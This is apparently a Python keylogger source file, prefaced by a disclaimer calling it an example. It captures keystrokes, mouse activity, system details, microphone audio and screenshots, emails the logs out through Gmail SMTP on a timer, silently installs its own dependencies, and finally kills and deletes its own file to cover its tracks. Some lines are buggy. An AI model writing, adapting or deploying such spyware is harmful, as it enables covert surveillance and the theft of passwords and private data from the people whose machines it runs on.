"""
    Not responsible for any misuse of this code.
    Purely for example purposes only
"""

# Try importing needed modules
try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice as sd
    from pynput import keyboard
    from pynput.keyboard import Listener
    from subprocess import call

# Catch exception if a module or modules aren't found
except ModuleNotFoundError:
    # Install the needed modules
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    EMAIL_ADDRESS = "Email Address"
    EMAIL_PASSWORD = "Password"
    SEND_REPORT_EVERY = 30000
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "Keylogger Started..."
            self.email = email
            self.password = password

        # Function to append logs
        def append_log(self, string):
            self.log = self.log + string

        # Function to detect mouse movement
        def on_move(self, x, y):
            current_move = logging.info("Mouse moved to {} {}".format(x, y))
            self.append_log(current_move)

        # Function to detect mouse clicks
        def on_click(self, x, y):
            current_click = logging.info("Mouse clicked {} {}".format(x, y))
            self.append_log(current_click)

        # Function to detect mouse scroll wheel
        def on_scroll(self, x, y):
            current_scroll = logging.info("Mouse scrolled to {} {}".format(x, y))
            self.append_log(current_scroll)

        # Function to save the keyboard interactions
        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.append_log(current_key)

        # Function to send email through gmail using smtp
        def send_mail(self, email, password, message):
            server = smtplib.SMTP(host='smtp.gmail.com', port=587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()

        def report(self):
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        # Function to get system information (hostname, ip, processor, system name, and machine type)
        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.append_log(hostname)
            self.append_log(ip)
            self.append_log(plat)
            self.append_log(system)
            self.append_log(machine)

        # Function to open the microphone and send logs
        def microphone(self):
            freq = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)
            obj.setsampwidth(2)
            obj.setframerate(freq)
            myrecording = sd.rec(int(seconds * freq), samplerate=freq, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()

            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)

        # Function to take a screenshot
        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)

        # Main run function
        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            if os.name is "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL " + os.path.basename(__file__))
                except OSError:
                    print('File is closed.')
            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is closed.')

    # Defining and running keylogger
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()